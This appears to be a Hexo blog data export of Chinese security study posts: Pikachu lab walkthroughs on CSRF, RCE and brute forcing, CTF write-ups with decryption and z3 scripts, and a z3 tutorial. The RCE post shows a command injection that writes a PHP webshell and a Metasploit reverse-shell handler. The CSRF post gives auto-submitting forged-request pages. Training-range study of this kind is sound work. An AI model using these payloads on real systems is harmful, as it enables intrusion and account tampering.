{"meta":{"title":"Hexo","subtitle":"","description":"","author":"snail","url":"https://corsnail.github.io","root":"/"},"pages":[{"title":"关于","date":"2023-07-04T06:21:36.942Z","updated":"2023-07-04T06:21:36.942Z","comments":false,"path":"about/index.html","permalink":"https://corsnail.github.io/about/index.html","excerpt":"","text":"Github: https://github.com/corsnailBlog: http://corsnail.github.io"},{"title":"Repositories","date":"2023-07-04T03:33:41.639Z","updated":"2023-06-08T06:52:04.461Z","comments":false,"path":"repository/index.html","permalink":"https://corsnail.github.io/repository/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-06-08T06:52:04.459Z","updated":"2023-06-08T06:52:04.459Z","comments":false,"path":"categories/index.html","permalink":"https://corsnail.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-06-08T06:52:04.462Z","updated":"2023-06-08T06:52:04.462Z","comments":false,"path":"tags/index.html","permalink":"https://corsnail.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-07-04T03:36:02.824Z","updated":"2023-06-08T06:52:04.460Z","comments":true,"path":"links/index.html","permalink":"https://corsnail.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"pikachu之CSRF","slug":"pikachu之CSRF","date":"2024-04-25T09:24:30.000Z","updated":"2024-04-25T09:25:03.988Z","comments":true,"path":"2024/04/25/pikachu之CSRF/","link":"","permalink":"https://corsnail.github.io/2024/04/25/pikachu%E4%B9%8BCSRF/","excerpt":"","text":"在 CSRF 的攻击场景中，攻击者会伪造一个请求，这个请求一般都是修改一些参数之类的请求，然后诱骗目标发送这个请求，一旦目标发送了这个请求，整个攻击就完成了。 CSRF 常常与 XSS 混淆：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。 GET这里的账号密码我就不去尝试了，直接用 tips 里面的账号密码这里我引入一个场景 攻击者：vince被攻击者：kobe我是 vince，我想通过 csrf 去修改 kobe 的性别、手机、住址和邮箱 这里我就首先进入 vince 的管理后台，然后修改信息，然后抓住请求然后让 kobe 发送这条请求 首先进入 vince 后台，修改信息 抓包 获取 get 请求 1http://172.17.10.4:8000/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=111111&amp;add=%E6%B4%9B%E6%9D%89%E7%9F%B6&amp;email=manbaout&amp;submit=submit 退出登录 模拟 kobe 登录后台 然后发送请求 发送往请求之后 kobe 的个人信息已经修改掉了 想象一下，这里修改掉的是密码会发生什么 利用小技巧 短链接使用短链接平台将 url 缩短 这里是将电话修改为 222222 的请求 然后我们让 kobe 发送这个请求然后 kobe 的手机改变了 结合 xss配合 xss 形成组合拳只要标签有 src 属性就可以尝试，包括 scirpt，iframe，img 等标签12345678&lt;html&gt;&lt;head&gt; &lt;title&gt;XSS&amp;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script src=&quot;http://172.17.10.4:8000/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=333333&amp;add=%E6%B4%9B%E6%9D%89%E7%9F%B6&amp;email=manbaout&amp;submit=submit&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 写入一个 xss. html，只要访问 http://172.17.10.4:8000/xss.html ，就会把 kobe 的手机号码修改为 333333 成功 1&lt;img src=&quot;http://172.17.10.4:8000/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=333333&amp;add=%E6%B4%9B%E6%9D%89%E7%9F%B6&amp;email=manbaout&amp;submit=submit&quot;&gt; 1&lt;iframe src=&quot;http://172.17.10.4:8000/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=333333&amp;add=%E6%B4%9B%E6%9D%89%E7%9F%B6&amp;email=manbaout&amp;submit=submit&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt; 只要有 src 标签都可以尝试 进阶的 html 构造 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;get&quot; id=&quot;csrf&quot; action=&quot;http://172.17.10.4:8000/vul/csrf/csrfget/csrf_get_edit.php?&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;%E5%A5%B3&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;333333&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;%E6%B4%9B%E6%9D%89%E7%9F%B6&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;manbaout&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 该表单通过： 1&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt; 实现自动触发提交 id 为 csrf 的表单，这个在实战中是比较实用的一个技巧。 POSTpost 请求是没有办法直接伪造 url 实现先抓包看看结合 xss 实现 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; id=&quot;csrf&quot; action=&quot;http://172.17.10.4:8000/vul/csrf/csrfpost/csrf_post_edit.php?&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;famle&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;5&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;lokia&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;manbaout&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 该表单通过： 1&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt; 实现自动触发提交 id 为 csrf 的表单，这个在实战中是比较实用的一个技巧。 网上看题解有用工具生成 html，感觉差别不大，这里就只放工具名字了OWASP CSRFTESTER工具 Token应该是加上了 token 校验，加上 token 校验难度就高了抓包看看这时候是 get 请求从国光 dvwa 靶场那看到两种方法 () 构造 html 实现 csrf JS 发起 HTTP CSRF 请求尝试未果，作罢，这个 token 绕过有点难 参考：Pikachu靶场全关攻略(超详细!)国光dvwa教程","categories":[{"name":"web","slug":"web","permalink":"https://corsnail.github.io/categories/web/"}],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://corsnail.github.io/tags/pikachu/"}]},{"title":"pikachu之RCE","slug":"pikachu之RCE","date":"2024-04-25T06:49:20.000Z","updated":"2024-04-25T06:50:19.863Z","comments":true,"path":"2024/04/25/pikachu之RCE/","link":"","permalink":"https://corsnail.github.io/2024/04/25/pikachu%E4%B9%8BRCE/","excerpt":"","text":"其实这两个都差不多 命令执行直接写入一句话木马 1127.0.0.1 | echo &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27; &gt; 1.php 这里下面其实没有必要，可以命令执行，这个靶场就已经足够了，但是想试试哥斯拉连接我这里用哥斯拉连接密码是 1，记得选择 php，测试连接成功过想试试反弹 shell这个哥斯拉很贴心啊，还有宝宝教程 123456789msf6 &gt; use exploit/multi/handler msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcppayload =&gt; php/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 192.168.137.193lhost =&gt; 192.168.137.193msf6 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf6 exploit(multi/handler) &gt; run 注意，这里的 LHOST 是攻击机自己的 ip，localhost，然后再哥斯拉中的 host 填入攻击机的 ip，反弹成功。然后就到此为止 代码执行docker 查看源码，发现未经任何过滤就传入 eval 执行 输入 phpinfo(); 直接执行了 一样可以写入马试试 1fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;); 查看容器，这里很明显直接写入了，这里就不用 webshell 工具连了","categories":[{"name":"web","slug":"web","permalink":"https://corsnail.github.io/categories/web/"}],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://corsnail.github.io/tags/pikachu/"}]},{"title":"paluctf wp","slug":"paluctf","date":"2024-04-24T10:15:24.000Z","updated":"2024-04-24T10:18:50.036Z","comments":true,"path":"2024/04/24/paluctf/","link":"","permalink":"https://corsnail.github.io/2024/04/24/paluctf/","excerpt":"","text":"记录一些不会的或者比赛会用到的 MiscFM 145.8 参考这篇博客 SSTV慢扫描电视（Slow-scan television 简称 SSTV）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。 表示这玩意真的出烂了，傻瓜式操作 使用工具：MMSSTV，e2eSoft文件类型：wav工具上就完了 e2esoft (VSC)是一个虚拟声卡工具，理解一下简单说就是选择一下输入输出设备让他转换一下 首先将声音输出到虚拟声卡 然后在电脑的音频输出的地方选择然后直接 MMSSTV 播放就可以出 flag 了公式化做题 为什么我的新猫猫吃不饱打开有一张图片 (png)，一张 gif首先这里用 010 看 gif看见一个很像 flag 的内容，注意不要把 HHT5 带进去了，flag 不包含这部分，然后随波逐流一把梭flag{my_ca1_然后来看另外一张图片 png 左边有一条竖的线，要么是 lsb，要么是盲水印这里我把 gif 切割为一帧一帧（puzzlesolver 工具或者 conver 1. gif 1. png 都可以）发现第 22 张图片很像puzzlesolver（不知道为什么复现变成这样了，之前和官方出题人那个很像）flag{my_ca1_1s_Fu11} 350x350比较简单，但是比较套，前面就不停的 binwalk 分析，binwalk -e 切割（或者 foremost 切割），多试一试几条命令，换几个平台，因为总有 bug讲讲最后拿到只剩下两张图片这里也可以看到我试了很多次最后的最后，会用到下面这个项目 https://github.com/guofei9987/blind_watermark?tab=readme-ov-file这个项目中水印可以是三种东西，文字、图片和二进制数据（其实你想，可以变成很多种东西） 这里的 3. png 是原图，33. png 是带水印的图 12345from blind_watermark import WaterMarkbwm1 = WaterMark(password_wm=1, password_img=1)# notice that wm_shape is necessarybwm1.extract(filename=&#x27;33.png&#x27;, wm_shape=(350, 350), out_wm_name=&#x27;extracted33.png&#x27;, ) 会导出一张二维码，扫描二维码得到数据flag&#123;b3bd61023d129f9e39b4a26b98c0f366&#125; ez_miscbinwalk 切割出一个图片，010 打开最后有一个很明显的编码要么是零宽隐写要么是snow snow 隐写内容 这里只需要将提取内容拿出来然后保存为 1. txt，然后直接用工具解出就行 1snow -C 1.txt Carefree and carefree应该是压缩包密码但是我这里还有伪加密 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度00 00：扩展记录长度 压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50)3F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度24 00：扩展字段长度00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性20 00 00 00：外部文件属性00 00 00 00：局部头部偏移量 压缩源文件目录结束标志：50 4B 05 06：目录结束标记00 00：当前磁盘编号00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数59 00 00 00：目录区尺寸大小3E 00 00 00：目录区对第一张磁盘的偏移量00 00：ZIP 文件注释长度 简单来说就是一个压缩包肯定会有上面的内容，伪加密就是本来这个 zip 没有压缩，但是我修改了标志位，然后计算机就以为它压缩了，我们只需要把这些标志位修改为 00 00 这道题目这里是压缩源文件目录区（可以根据文件头标志匹配）这里的全局方式位标记为 09 00，修改为 00 00 即可解压之后使用上面的密码即可拿到flagflag&#123;b220116fc6ca827ecf3cb6c6c06dac26&#125; RePylupyinstxtractor 解包pycdc 反编译出来然后发现竟然是个密码题 尝试用 z3 爆破但是觉得可能性不大，所以只爆了 1min 就结束了赛后看 wp，就是用 z3 爆破的，可恶 12345678910111213141516171819202122import z3from Crypto.Util.number import *def enc(key): R = bytes_to_long(b&quot;Welcome To PaluCTF!&quot;) MOD = 2**418 R = R ^ (R - 60) &gt;&gt; 24 R = R ^ (R - 60) &lt;&lt; 88 R ^= key R = (-R * R * 2024) % MOD R = (R * key) % MOD return Rcor = 0x2E441F765514CCA89173554726494D37E9FBE774B6F807BC5F6E71117530CE3D7DB5F70554C03CD9055F4E42969600904DF1F4DB8s = z3.Solver()key = z3.BitVec(&quot;key&quot;, 418)s.add(enc(key)==cor)s.check()m = s.model()flag = long_to_bytes(m[key].as_long())print(flag) 茶判断是 chacha2.0然后简单看看 enc 和 key 1234enc = &quot;f568c48912eed6dc520c7164f44b6378e1d0d3e248914fa8847b405a131f&quot;key = &quot;SGludDogSW1wcm92ZSBvZiBTYWxzYTIw&quot;&quot;Is_This_TEA?&quot; 动调过程中发现去掉了最后四字节借鉴脚本 1234567891011from Crypto.Cipher import ChaCha20enc_data = bytes.fromhex(&quot;f568c48912eed6dc520c7164f44b6378e1d0d3e248914fa8847b405a131f&quot;)key = b&quot;SGludDogSW1wcm92ZSBvZiBTYWxzYTIw&quot;nonce = b&quot;Is_This_&quot;cc = ChaCha20.new(key=key, nonce=nonce)print(cc.decrypt(enc_data)) flag{But_I_Like_ChaCha20_More} O2查壳 直接用 ida 打开错误用 010 打开跑一下模板 这个地方是用来判断 elf 的位数的，ctf 常考点，尝试修改1是32位，2是64位现在改为 02 然后导出副本，发现是可以的 用 ida 打开定位到关键函数 enc对三个参数进行分析，发现第三个参数是 key（PaluCTF）那么第一个参数就是 output，加密后的 flag !注意!：这里的变量需要动态调试的时候才会加载进去 这里差不多，加密逻辑清晰，ouput 最后要与 obj 比较，也就是说 已知：加密逻辑，输出密文，key 那么我们就可以求出 flag 了这里还是爆破比较好，因为加密比较难看 借鉴的 wp 123456789101112from string import printableenc = bytearray.fromhex(&quot;364d4d5c3e387e00421c597a0a7302144d5b70087e064619567336297d151f56770a7935424f2a780643&quot;)key = &quot;PaluCTF&quot;for i in range(len(enc)): for c in printable: if (ord(c) + ord(key[i % len(key)])) % 128 == enc[i]: print(c, end=&quot;&quot;) break flag{d80a0d76-23af-486e-a0bc-43a463eac552}另外一篇博客 z3 求解的时候会用 z3 求一遍 参考：帕鲁杯 Writeup","categories":[{"name":"wp","slug":"wp","permalink":"https://corsnail.github.io/categories/wp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://corsnail.github.io/tags/CTF/"}]},{"title":"pikachu之暴力破解","slug":"pikachu之暴力破解","date":"2024-04-19T07:15:24.000Z","updated":"2024-04-19T07:17:40.934Z","comments":true,"path":"2024/04/19/pikachu之暴力破解/","link":"","permalink":"https://corsnail.github.io/2024/04/19/pikachu%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","excerpt":"","text":"基于表单的暴力破解bp 抓包放入爆破器选择交叉爆破分别都导入字典，然后 start attack爆出来三组账号密码admin 123456test abc123pikachu 000000当然这里字典是针对性加的 验证码绕过（on server）这种服务器后台不刷新验证码，只要抓包后不放包就可以一直用抓包看看抓包带上验证码，试试爆破配置啥的和上面一样都是交叉爆破最后同样爆破出来的，这里是因为验证码不变，可以无限复用 验证码绕过（on client）这里和上面一样，也是用验证码直接爆破就行这里的不同是将验证码的生成规则直接写在了前端当然这里使用随机数实现的验证码，如果是基于时间戳之类的还可以用 python 脚本发包来爆破 token 防爆破这里加入了 token，也是一种校验用的东西，带上它，就可以一定程度上防止爆破 简单来说 token 就是服务器给客户端发的身份证，客户端发请求时要带上这个身份证，不然就是不合法请求 这里我们再用相同的方法去爆破，可以看到提示 token 失败 带上 token 爆破这里像这样单线程跑整个爆破然后加一个 grep，点击add点击 refetch，然后搜索token选中 value 所指的值，然后点击 ok然后回到 payload 中，选择 3，然后 payload 类型选择从 grep 中获取，然后填入第一个 token效率很慢，但是这里的 root root 的时候会提示账号密码不存在，也就是说 token 是生效的突然想起来，这里爆破类型选择了这个简单理解一下，假如有两个等待爆破的参数他们的字典都是 123rootadmin123456 Cluster bomb 的爆破就是 123456| root | root || root | admin || root | 123456 || admin | root || admin | admin || admin | 123456 | Pitchfork 则是 123| root | root || admin | admin || 123456 | 123456 | 所以这里应该选择 Pitchfork同时我这里减少爆破项，减少爆破时间得到 admin 的密码 123456 参考文章：渗透测试-验证码的爆破与绕过","categories":[{"name":"web","slug":"web","permalink":"https://corsnail.github.io/categories/web/"}],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://corsnail.github.io/tags/pikachu/"}]},{"title":"VenomCTF REWP","slug":"VenomCTFWP","date":"2024-03-21T10:47:17.000Z","updated":"2024-03-27T04:31:32.929Z","comments":true,"path":"2024/03/21/VenomCTFWP/","link":"","permalink":"https://corsnail.github.io/2024/03/21/VenomCTFWP/","excerpt":"","text":"这是某团队的招新赛总体难度还是不大的，这里写一下RE一道题目的WP ezre一道简单题，总结就是换表base64，变异RC4 分析很简单的逻辑 第一个函数对key进行处理，由于对key处理的各种参数都是明文的，所以我们可以在这里下断点获取处理之后的key。 第二个函数对flag操作，将flag与一个变换后的key进行操作，由于变换的key比较复杂，同时变换的key同样与我们输入的参数无关，只需要使用原来的c代码就可以获取 第三个函数对flag最后处理，有个很明显的码表，大概能猜到是base64，仔细看看也能确定是base64。 解题脚本下断点拿到key的值 通过脚本拿到xor_key的值 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;stdint.h&gt;#define HIDWORD(x) ((uint32_t)(((uint64_t)(x) &gt;&gt; 32) &amp; 0xFFFFFFFF))int main() &#123; int v6; // [rsp+24h] [rbp-14h] int v7; // [rsp+28h] [rbp-10h] unsigned __int64 i; // [rsp+30h] [rbp-8h] int v3; int v5; int len = 21; v6 = 0; v7 = 0; unsigned char key[128] = &#123; 0x54, 0x0D, 0x08, 0x60, 0x14, 0x2C, 0x41, 0x2A, 0x30, 0x2E, 0x1C, 0x66, 0x1B, 0x47, 0x32, 0x74, 0x65, 0x05, 0x68, 0x7E, 0x23, 0x24, 0x52, 0x5C, 0x48, 0x71, 0x11, 0x21, 0x25, 0x04, 0x3E, 0x4D, 0x5B, 0x4C, 0x17, 0x29, 0x78, 0x45, 0x00, 0x3C, 0x7B, 0x6B, 0x6A, 0x5A, 0x50, 0x61, 0x19, 0x15, 0x73, 0x7D, 0x75, 0x43, 0x3D, 0x3A, 0x70, 0x16, 0x77, 0x0C, 0x67, 0x51, 0x6F, 0x03, 0x6D, 0x58, 0x4E, 0x37, 0x12, 0x2D, 0x4A, 0x1A, 0x4F, 0x5F, 0x4B, 0x7C, 0x55, 0x0F, 0x1D, 0x0E, 0x31, 0x6E, 0x79, 0x1E, 0x22, 0x36, 0x69, 0x7A, 0x28, 0x26, 0x53, 0x56, 0x0B, 0x63, 0x5E, 0x64, 0x72, 0x3B, 0x5D, 0x0A, 0x42, 0x01, 0x2F, 0x13, 0x09, 0x46, 0x3F, 0x6C, 0x7F, 0x44, 0x1F, 0x34, 0x18, 0x57, 0x20, 0x39, 0x38, 0x02, 0x76, 0x10, 0x59, 0x49, 0x07, 0x27, 0x40, 0x2B, 0x35, 0x33, 0x62,0x06 &#125;; for ( i = 0LL; ; ++i ) &#123; if ( i &gt;= len ) break; v6 = (v6 + 1) % 128; v3 = *(v6 + key) + v7; // v3 = key[v6] + v7 v7 = (((HIDWORD(v3) &gt;&gt; 25) + *(v6 + key) + v7) &amp; 0x7F) - (HIDWORD(v3) &gt;&gt; 25); v5 = *(v6 + key); // v5 = key[v6] *(v6 + key) = *(v7 + key); // key[v6] = key[v7] *(key + v7) = v5; // key[v7] = v5 printf(&quot;%d,&quot;,*(((*(v6 + key) + *(v7 + key)) &amp; 0x7F) + key));// flag[i] ^= key[(key[v6] + key[v7]) &amp; 0x7f] &#125; // key[v7] = v5&#125;//105,80,32,18,9,17,58,107,45,32,87,66,88,25,63,99,80,56,12,95,94, 编写python脚本解密即可 123456789101112131415161718import base64import stringkey = [0x54, 0x0D, 0x08, 0x60, 0x14, 0x2C, 0x41, 0x2A, 0x30, 0x2E, 0x1C, 0x66, 0x1B, 0x47, 0x32, 0x74, 0x65, 0x05, 0x68, 0x7E, 0x23, 0x24, 0x52, 0x5C, 0x48, 0x71, 0x11, 0x21, 0x25, 0x04, 0x3E, 0x4D, 0x5B, 0x4C, 0x17, 0x29, 0x78, 0x45, 0x00, 0x3C, 0x7B, 0x6B, 0x6A, 0x5A, 0x50, 0x61, 0x19, 0x15, 0x73, 0x7D, 0x75, 0x43, 0x3D, 0x3A, 0x70, 0x16, 0x77, 0x0C, 0x67, 0x51, 0x6F, 0x03, 0x6D, 0x58, 0x4E, 0x37, 0x12, 0x2D, 0x4A, 0x1A, 0x4F, 0x5F, 0x4B, 0x7C, 0x55, 0x0F, 0x1D, 0x0E, 0x31, 0x6E, 0x79, 0x1E, 0x22, 0x36, 0x69, 0x7A, 0x28, 0x26, 0x53, 0x56, 0x0B, 0x63, 0x5E, 0x64, 0x72, 0x3B, 0x5D, 0x0A, 0x42, 0x01, 0x2F, 0x13, 0x09, 0x46, 0x3F, 0x6C, 0x7F, 0x44, 0x1F, 0x34, 0x18, 0x57, 0x20, 0x39, 0x38, 0x02, 0x76, 0x10, 0x59, 0x49, 0x07, 0x27, 0x40, 0x2B, 0x35, 0x33, 0x62, 0x06]enc_flag = &quot;3pn1Ek92hmAEg38EXMn99J9YBf8=&quot;string1 = &quot;0123456789XYZabcdefghijklABCDEFGHIJKLMNOPQRSTUVWmnopqrstuvwxyz+/=&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;enc_flag1 = base64.b64decode(enc_flag.translate(str.maketrans(string1,string2))) #string1码表替换string2xor_key = [105,80,32,18,9,17,58,107,45,32,87,66,88,25,63,99,80,56,12,95,94,]flag = &#x27;&#x27;for i in range(1,20): flag += chr(enc_flag1[i]^xor_key[i])print(flag)//lag&#123;Simple_rEvErse&#125; 得到结果可能是数据缺失，得到结果即可，仔细看其实是RC4算法，过程中灵活运用来减少时间。","categories":[{"name":"wp","slug":"wp","permalink":"https://corsnail.github.io/categories/wp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://corsnail.github.io/tags/CTF/"}]},{"title":"z3求解器的简单使用","slug":"z3求解器的简单使用","date":"2023-11-07T02:42:02.000Z","updated":"2023-11-07T08:39:04.225Z","comments":true,"path":"2023/11/07/z3求解器的简单使用/","link":"","permalink":"https://corsnail.github.io/2023/11/07/z3%E6%B1%82%E8%A7%A3%E5%99%A8%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"之前遇见简单的逆向题用z3求解器简单求过，但是没有仔细学习过，这次又遇到一道逆向题，听说z3爆破很有作用 基本数据类型12345Int #整型Bool #布尔型Real #实数Array #数组BitVec(&#x27;a&#x27;,8) #char型 其中BitVec是一个比较灵活的数据结构，他可以指定特定大小。比如使用BitBec(‘a’,32)就可以表示c语言的int型 常用语法solver()solver()会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解 add()add()用来添加约束条件，约束条件通常是一个逻辑等式 check()check()如其名，用于判断，有解会回显sat，无解会回显unsat model()model()用于多解集的情况，它会限制条件所对应的解集的交集，得出唯一解 常用求解四步骤：创建约束求解器 1solver = Solver() 添加约束条件（这一步是z3求解的关键） 1solver.add() 判断解是否存在 1if solver.check()==sat: 求解 1print solver.model() 使用实例感觉难度不是很大，接下来就要从编写脚本中体验了NewStarCTF 2023的逆向R4ndom,通过一个码表加密flag，进行了下面这样一个运算(题解实际还包含一个随机数和一个反调试题解) 1input[i] = Table[(16 * ((tmp + rand_num % 255) &gt;&gt; 4) + 15) &amp; (tmp + rand_num % 255)]; 题目链接 直接写python也不是不能写，代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243import randomtable = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]enc = [0xEE, 0xE6, 0xD7, 0xB2, 0x8A, 0xAB, 0x13, 0x35, 0x02, 0x7B, 0xC9, 0xB9, 0x9C, 0xBA, 0xED, 0x2E, 0xBD, 0x4F, 0xFA, 0xEE, 0xC8, 0xF8, 0xE4, 0x16, 0x82, 0x63, 0x3B, 0x98, 0xF4, 0x14, 0x30, 0x38, 0x07, 0x36, 0x84, 0x3D, 0x0C, 0x36, 0x32, 0xEA, 0x55, 0xA6]rkey = [51,137,172,215,84,204,74,165,53,209,219,163,230,147,15,127,149,77,231,101,128,175,107,210,204,205,20,173,141,105,198,64,242,242,24,71,64,226,108,117,180,72,]flag = &quot;&quot;for j in range(len(enc)): for i in range(32, 126): i = int(i) tmp = table[((16 * ((i + rkey[j] % 255) &gt;&gt; 4) + 15) &amp; (i + rkey[j] % 255)) &amp; 0xff] if enc[j] == tmp: flag += chr(i) breakprint(flag) 接下来我用z3来求一求 123456789101112131415161718192021222324from z3 import *...# 这里将索引获取index = []for i in enc: index.append((table.index(i)))# 创建 Z3 求解器s = Solver()# 创建符号变量 temptemp = [BitVec(&#x27;%d&#x27; % i, 8) for i in range(len(enc))]# 添加len(enc)个约束条件for i in range(len(enc)): constraint = index[i] == (16 * ((temp[i] + rkey[i] % 255) &gt;&gt; 4) + 15) &amp; (temp[i] + rkey[i] % 255) s.add(constraint)if s.check() == sat: indexult = s.model() for i in range(len(enc)): flag += chr(indexult[temp[i]].as_long())print(flag) 通过添加很多个约束条件来利用z3求解，效率还是挺高的 